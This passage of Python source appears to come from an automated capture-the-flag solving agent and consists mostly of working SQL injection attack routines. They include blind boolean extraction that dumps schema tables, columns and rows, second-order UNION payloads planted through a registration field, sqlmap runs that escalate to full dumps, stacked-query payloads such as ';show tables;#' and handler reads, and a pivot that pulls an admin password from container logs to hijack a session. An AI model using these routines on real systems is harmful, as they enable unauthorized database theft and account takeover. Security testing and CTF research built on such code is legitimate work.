            direct_blob = await self._blind_extract_string(oracle, expr, budget)
            if direct_blob:
                reasons.append("probed direct flag location")
            if hit := await self._blind_scan_for_flag(target, direct_blob, "direct flag location"):
                return hit

        # Bounded schema walk: tables -> per-table columns -> row blob.
        tables_blob = await self._blind_extract_string(oracle, _BLIND_TABLES_EXPR, budget)
        if hit := await self._blind_scan_for_flag(target, tables_blob, "table dump"):
            return hit
        tables = [
            t for t in tables_blob.split(",") if re.fullmatch(r"[A-Za-z0-9_]+", t or "")
        ]
        if tables:
            reasons.append(f"blind dumped tables: {', '.join(tables[:4])}")
            await self._store_note(
                key="ctf_blind_sqli_tables",
                value=json.dumps({"tables": tables[:10]}, ensure_ascii=False),
                category="finding",
                target=host,
                url=target,
            )

        def _table_rank(name: str) -> tuple[bool, str]:
            low = name.lower()
            interesting = any(
                tok in low for tok in ("flag", "key", "secret", "ctf", "user", "geek", "world")
            )
            return (not interesting, name)

        for table in sorted(tables, key=_table_rank)[:4]:
            if budget.get("n", 0) >= _BLIND_MAX_EXTRACT_REQUESTS:
                break
            table_hex = "0x" + table.encode().hex()
            cols_expr = (
                "select(group_concat(column_name))from(information_schema.columns)"
                f"where(table_name={table_hex})"
            )
            cols_blob = await self._blind_extract_string(oracle, cols_expr, budget)
            if hit := await self._blind_scan_for_flag(target, cols_blob, f"column dump {table}"):
                return hit
            cols = [c for c in cols_blob.split(",") if re.fullmatch(r"[A-Za-z0-9_]+", c or "")]
            if not cols:
                continue
            reasons.append(f"blind dumped columns of {table}: {', '.join(cols[:4])}")
            concat_cols = ",".join(f"ifnull({_quote_sql_identifier(c)},0x20)" for c in cols)
            rows_expr = (
                f"select(group_concat(concat_ws(0x7e,{concat_cols})))"
                f"from({_quote_sql_identifier(table)})"
            )
            rows_blob = await self._blind_extract_string(oracle, rows_expr, budget)
            if hit := await self._blind_scan_for_flag(target, rows_blob, f"row dump {table}"):
                return hit
            reasons.append(f"blind dumped rows from {table}")

        # Oracle confirmed injection even if no flag surfaced — that is progress.
        return _ChainOutcome(progress=True, reason="; ".join(reasons))

    async def _second_order_store(
        self,
        store_url: str,
        method: str,
        field: str,
        value: str,
        extra: dict[str, Any],
    ) -> dict[str, Any]:
        fields: dict[str, str] = {field: value}
        for key, val in (extra or {}).items():
            fields.setdefault(str(key), str(val))
        if method == "GET":
            return await self.runtime.proxy_action(
                "request", method="GET", url=_with_query(store_url, fields), timeout=20
            ) or {}
        return await self.runtime.proxy_action(
            "request", method="POST", url=store_url, data=fields, timeout=20
        ) or {}

    async def _second_order_trigger(
        self,
        trigger_url: str,
        method: str,
        param: str | None,
        value: str | None,
    ) -> dict[str, Any]:
        if method == "GET":
            url = trigger_url
            if param and value is not None:
                url = _with_query(trigger_url, {str(param): value})
            return await self.runtime.proxy_action(
                "request", method="GET", url=url, timeout=20
            ) or {}
        data = {str(param): value} if param and value is not None else {}
        return await self.runtime.proxy_action(
            "request", method="POST", url=trigger_url, data=data, timeout=20
        ) or {}

    async def _attempt_second_order_sqli(
        self,
        target: str,
        exploit_info: dict[str, Any],
        *,
        artifact_url: str,
    ) -> _ChainOutcome:
        """Store a UNION payload in one request, extract it from the trigger query.

        Models the cyberpunk-class ceiling. ``exploit_info`` (built by
        ``_recent_second_order_sqli_source_exploit`` from leaked source) names the
        store surface (registration/create field) and the trigger endpoint that
        re-queries the stored value. Phase A confirms the deferred UNION reflects
        by planting a sentinel across column-count × position layouts; Phase B
        walks a compact flag-location repertoire at the confirmed layout. A
        recovered flag is verification-gated (evidence: http-response).
        """
        self.tool_guard.require(["http_request"])
        payloads = exploit_info if isinstance(exploit_info, dict) else {}
        store_field = str(payloads.get("store_field") or "username")
        store_method = str(payloads.get("store_method") or "POST").upper()
        trigger_method = str(payloads.get("trigger_method") or "GET").upper()
        trigger_param = payloads.get("trigger_param")
        trigger_param = str(trigger_param) if trigger_param else None
        store_extra = payloads.get("store_extra") if isinstance(payloads.get("store_extra"), dict) else {}
        base = _base_target(target)
        store_url = urljoin(base + "/", str(payloads.get("store_path") or "/register").lstrip("/"))
        trigger_url = urljoin(base + "/", str(payloads.get("trigger_path") or "/").lstrip("/"))
        host = urlparse(target).netloc or target

        self._emit(
            f"[CTF dispatcher] second-order SQLi: store {store_field}@{store_url} "
            f"→ trigger {trigger_url} ({artifact_url})"
        )

        budget = _SECOND_ORDER_REQUEST_BUDGET
        nonce_seq = 0
        progress = False
        confirmed: tuple[int, int, str] | None = None

        # Phase A — confirm the deferred UNION reflects; discover column layout.
        for column_count in range(1, _SECOND_ORDER_MAX_COLUMNS + 1):
            for position in range(1, column_count + 1):
                for separator in ("/**/", " "):
                    if budget <= 0:
                        break
                    budget -= 1
                    nonce_seq += 1
                    nonce = f"fh2o{nonce_seq:04d}"
                    value = _second_order_union_value(
                        nonce, _SECOND_ORDER_SENTINEL_HEX, column_count, position, separator
                    )
                    await self._second_order_store(store_url, store_method, store_field, value, store_extra)
                    resp = await self._second_order_trigger(
                        trigger_url, trigger_method, trigger_param, value if trigger_param else None
                    )
                    body = str((resp or {}).get("body") or "")
                    progress = progress or bool(body)
                    await self._scan_and_store(body, target, evidence_source="http-response")
                    if _SECOND_ORDER_SENTINEL in body:
                        confirmed = (column_count, position, separator)
                        break
                if confirmed is not None:
                    break
            if confirmed is not None:
                break

        if confirmed is None:
            return _ChainOutcome(
                progress=progress, reason="second-order SQLi: no deferred UNION oracle reflected"
            )

        column_count, position, separator = confirmed
        await self._store_note(
            key="ctf_second_order_sqli_confirmed",
            value=(
                f"deferred UNION reflects at {trigger_url} via stored {store_field} "
                f"(cols={column_count}, echo-position={position})"
            ),
            category="vulnerability",
            target=host,
            url=trigger_url,
            weaknesses=[
                {
                    "id": "second-order-sqli",
                    "description": (
                        "A value stored in one request is re-queried unsanitized on a "
                        "trigger endpoint; a UNION payload planted at the store surface "
                        "executes in the deferred query."
                    ),
                }
            ],
        )

        # Phase B — extract the flag at the confirmed layout.
        for expr in _SECOND_ORDER_FLAG_EXPRS:
            if budget <= 0:
                break
            budget -= 1
            nonce_seq += 1
            nonce = f"fh2o{nonce_seq:04d}"
            value = _second_order_union_value(nonce, expr, column_count, position, separator)
            await self._second_order_store(store_url, store_method, store_field, value, store_extra)
            resp = await self._second_order_trigger(
                trigger_url, trigger_method, trigger_param, value if trigger_param else None
            )
            body = str((resp or {}).get("body") or "")
            await self._scan_and_store(body, target, evidence_source="http-response")
            if flag := self._extract_runtime_flag(body):
                verification = await self._observe_flag(
                    flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"second-order SQLi via stored {store_field} → {trigger_url}",
                )
                if verification.decision in {"verified", "runtime"}:
                    await self._store_note(
                        key="ctf_second_order_sqli_extract",
                        value=f"second-order UNION extract succeeded via {artifact_url}",
                        category="vulnerability",
                        target=host,
                        url=trigger_url,
                        weaknesses=[
                            {
                                "id": "second-order-sqli",
                                "description": "Deferred UNION injection recovered the flag from the trigger query.",
                            }
                        ],
                    )
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"second-order SQLi runtime exploit via {artifact_url}",
                        verified=verification.decision == "verified",
                    )

        # Oracle confirmed even without a flag — genuine progress.
        return _ChainOutcome(
            progress=True, reason="second-order SQLi oracle confirmed but flag not extracted"
        )

    async def _attempt_sqlmap_sqli(
        self,
        target: str,
        *,
        auth_form: dict[str, Any] | None = None,
    ) -> _ChainOutcome:
        self.tool_guard.require(["sqlmap"])
        try:
            from ...tools.sqlmap import run_sqlmap
        except Exception as exc:
            return _ChainOutcome(progress=False, reason=f"sqlmap tool unavailable: {exc}")

        sqlmap_url = target
        sqlmap_data = ""

        if auth_form:
            sqlmap_url, sqlmap_data = _build_sqlmap_target_from_form(target, auth_form)

        result = await run_sqlmap(
            url=sqlmap_url,
            data=sqlmap_data,
            level=1,
            risk=1,
            runtime=self.runtime,
        )
        raw = str(result.get("raw") or "")
        await self._scan_and_store(raw, target, evidence_source="command-output")

        if result.get("error"):
            return _ChainOutcome(progress=False, reason=str(result["error"]))

        vulnerable = bool(result.get("vulnerable"))
        injection_points = result.get("injection_points") or []
        databases = result.get("databases") or []
        if vulnerable or injection_points or databases:
            await self._store_note(
                key="ctf_sqli_sqlmap",
                value=json.dumps(
                    {
                        "url": sqlmap_url,
                        "data": sqlmap_data,
                        "vulnerable": vulnerable,
                        "injection_points": injection_points[:3],
                        "databases": databases[:10],
                    },
                    ensure_ascii=False,
                ),
                category="finding",
                target=urlparse(target).netloc or target,
                url=sqlmap_url,
            )

        extracted_flag = self._extract_flag(raw)
        if extracted_flag:
            verification = await self._observe_flag(
                extracted_flag,
                target,
                evidence_source="command-output",
                rationale="sqlmap extracted flag",
            )
            if verification.decision == "verified":
                return _ChainOutcome(
                    progress=True,
                    flag=verification.flag,
                    reason="sqlmap extracted flag",
                )

        # Detection confirmed an injection but the flag never appeared: the
        # detection-only pass does not dump table data, so a boolean-blind flag
        # in a DB cell is structurally unreachable. Escalate to a bounded dump.
        if vulnerable or injection_points:
            dump_result = await run_sqlmap(
                url=sqlmap_url,
                data=sqlmap_data,
                level=1,
                risk=1,
                runtime=self.runtime,
                dump=True,
            )
            dump_raw = str(dump_result.get("raw") or "")
            if dump_raw:
                await self._scan_and_store(
                    dump_raw, target, evidence_source="command-output"
                )
            dumped_flag = self._extract_flag(dump_raw)
            if dumped_flag:
                verification = await self._observe_flag(
                    dumped_flag,
                    target,
                    evidence_source="command-output",
                    rationale="sqlmap dumped flag",
                )
                if verification.decision == "verified":
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason="sqlmap dumped flag",
                    )

        return _ChainOutcome(
            progress=bool(vulnerable or injection_points or databases),
            reason="sqlmap finished without direct flag",
        )

    async def _attempt_generic_param_sqli(
        self,
        target: str,
        page_features: dict[str, Any],
    ) -> _ChainOutcome:
        self.tool_guard.require(["http_request"])
        forms = [
            form
            for form in (page_features.get("forms") or [])
            if isinstance(form, dict)
            and str(form.get("method") or "GET").strip().upper() == "GET"
        ]
        if not forms:
            return _ChainOutcome(progress=False, reason="generic param sqli: no GET form found")

        candidate_form = None
        candidate_field = ""
        baseline_value = "1"
        for form in forms:
            for item in form.get("inputs") or []:
                if not isinstance(item, dict):
                    continue
                name = str(item.get("name") or "").strip()
                if not name:
                    continue
                field_type = str(item.get("type") or "text").strip().lower()
                if field_type in {"submit", "button", "image", "reset", "hidden"}:
                    continue
                candidate_form = form
                candidate_field = name
                baseline_value = str(item.get("value") or "").strip() or "1"
                break
            if candidate_form is not None:
                break

        if candidate_form is None or not candidate_field:
            return _ChainOutcome(progress=False, reason="generic param sqli: injectable field not found")

        progress = False
        reasons: list[str] = []
        baseline_fields = {candidate_field: baseline_value}
        baseline_resp, _ = await self._submit_form_request(target, candidate_form, baseline_fields)
        baseline_body = str((baseline_resp or {}).get("body") or "")
        await self._scan_and_store(baseline_body, target, evidence_source="http-response")
        progress = progress or bool(baseline_body)

        quote_payload = f"{baseline_value}'"
        quote_resp, quote_url = await self._submit_form_request(
            target,
            candidate_form,
            {candidate_field: quote_payload},
        )
        quote_body = str((quote_resp or {}).get("body") or "")
        await self._scan_and_store(quote_body, quote_url, evidence_source="http-response")
        quote_lower = quote_body.lower()
        if any(marker in quote_lower for marker in ("sql syntax", "error 1064", "mariadb")):
            progress = True
            reasons.append("generic param quote probe triggered SQL error")

        show_tables_payload = f"{baseline_value}';show tables;#"
        tables_resp, tables_url = await self._submit_form_request(
            target,
            candidate_form,
            {candidate_field: show_tables_payload},
        )
        tables_body = str((tables_resp or {}).get("body") or "")
        await self._scan_and_store(tables_body, tables_url, evidence_source="http-response")
        table_names = self._extract_php_var_dump_strings(tables_body)
        table_names = [
            name
            for name in table_names
            if name
            and name not in {baseline_value, "hahahah"}
            and re.fullmatch(r"[A-Za-z0-9_]+", name)
        ]
        table_names = list(dict.fromkeys(table_names))
        if table_names:
            progress = True
            reasons.append(f"stacked query exposed tables: {', '.join(table_names[:3])}")
            await self._store_note(
                key="ctf_sqli_stacked_tables",
                value=json.dumps({"tables": table_names[:10]}, ensure_ascii=False),
                category="finding",
                target=urlparse(target).netloc or target,
                url=tables_url,
            )

        prioritized_tables = sorted(
            table_names,
            key=lambda name: (name == "words", not name.isdigit(), name),
        )
        for table_name in prioritized_tables[:4]:
            quoted_table = _quote_sql_identifier(table_name)
            columns_payload = f"{baseline_value}';show columns from {quoted_table};#"
            columns_resp, columns_url = await self._submit_form_request(
                target,
                candidate_form,
                {candidate_field: columns_payload},
            )
            columns_body = str((columns_resp or {}).get("body") or "")
            await self._scan_and_store(columns_body, columns_url, evidence_source="http-response")
            column_values = self._extract_php_var_dump_strings(columns_body)
            if column_values:
                progress = True
                reasons.append(f"show columns succeeded for {table_name}")
                await self._store_note(
                    key=f"ctf_sqli_columns_{table_name}",
                    value=json.dumps({"table": table_name, "columns": column_values[:12]}, ensure_ascii=False),
                    category="finding",
                    target=urlparse(target).netloc or target,
                    url=columns_url,
                )
            if "flag" not in {value.lower() for value in column_values}:
                continue

            handler_payload = (
                f"{baseline_value}';handler {quoted_table} open;"
                f"handler {quoted_table} read first;#"
            )
            handler_resp, handler_url = await self._submit_form_request(
                target,
                candidate_form,
                {candidate_field: handler_payload},
            )
            handler_body = str((handler_resp or {}).get("body") or "")
            await self._scan_and_store(handler_body, handler_url, evidence_source="http-response")
            if extracted_flag := self._extract_flag(handler_body):
                verification = await self._observe_flag(
                    extracted_flag,
                    target,
                    evidence_source="http-response",
                    rationale=f"stacked query handler read from {table_name}",
                    evidence_url=handler_url,
                    evidence_snippet=handler_body[:240],
                    strategy_kind="generic_param_sqli",
                )
                if verification.decision in {"verified", "runtime"}:
                    return _ChainOutcome(
                        progress=True,
                        flag=verification.flag,
                        reason=f"stacked query handler read from {table_name}",
                    )
                progress = True
                reasons.append(f"handler read from {table_name} produced {verification.decision} flag")

        return _ChainOutcome(
            progress=progress,
            reason="; ".join(reasons) if reasons else "generic param sqli fallback exhausted",
        )

    async def _attempt_local_challenge_log_pivot(
        self,
        *,
        target: str,
        page_features: dict[str, Any],
        hint: str,
    ) -> _ChainOutcome:
        self.tool_guard.require(["terminal", "http_request"])
        challenge_root, compose_file = self._resolve_registered_local_challenge_paths()
        if compose_file is None:
            challenge_root = _extract_local_challenge_root(hint, self._challenge_context)
            if challenge_root is None:
                return _ChainOutcome(progress=False, reason="")
            compose_file = _resolve_compose_file(challenge_root)
        if compose_file is None:
            return _ChainOutcome(progress=False, reason="")

        auth_form = find_auth_form(page_features.get("forms") or [])
        if not auth_form:
            return _ChainOutcome(progress=False, reason="")
        username_field = _pick_form_field(auth_form, "username")
        password_field = _pick_form_field(auth_form, "password")
        if not username_field or not password_field:
            return _ChainOutcome(progress=False, reason="")
        endpoints = {str(item).strip() for item in (page_features.get("endpoints") or []) if str(item).strip()}
        endpoints.update(self._recent_local_source_hint_routes())
        if "/admin" not in endpoints:
            return _ChainOutcome(progress=False, reason="")

        command = _docker_compose_logs_command(compose_file)
        result = await self.runtime.execute_command(command, timeout=30)
        log_blob = "\n".join(
            part for part in (str(getattr(result, "stdout", "") or ""), str(getattr(result, "stderr", "") or "")) if part
        )
        password = _extract_admin_password_from_logs(log_blob)
        if not password:
            return _ChainOutcome(progress=False, reason="local challenge logs contained no reusable admin credential")

        await self._store_secret_note("admin_password", password, target)
        login_url = _resolve_auth_login_url(
            target=target,
            auth_form=auth_form,
            endpoints=endpoints,
        )
        login_resp = await self.runtime.proxy_action(
            "request",
            method="POST",
            url=login_url,
            data={username_field: "admin", password_field: password},
            timeout=15,
        )
        login_body = str((login_resp or {}).get("body") or "")
        await self._scan_and_store(login_body, target, evidence_source="http-response")
        sid = _extract_sid_from_login_response(login_resp)
        if not sid:
            return _ChainOutcome(progress=False, reason="local challenge log pivot recovered password but no sid")
        await self._store_secret_note("sid", sid, target)
        flag = await self._fetch_admin_with_sid(_base_target(target), sid)
        if flag:
            return _ChainOutcome(progress=True, flag=flag, reason="local challenge log pivot via compose logs")
        return _ChainOutcome(progress=False, reason="local challenge log pivot recovered credential but no flag")
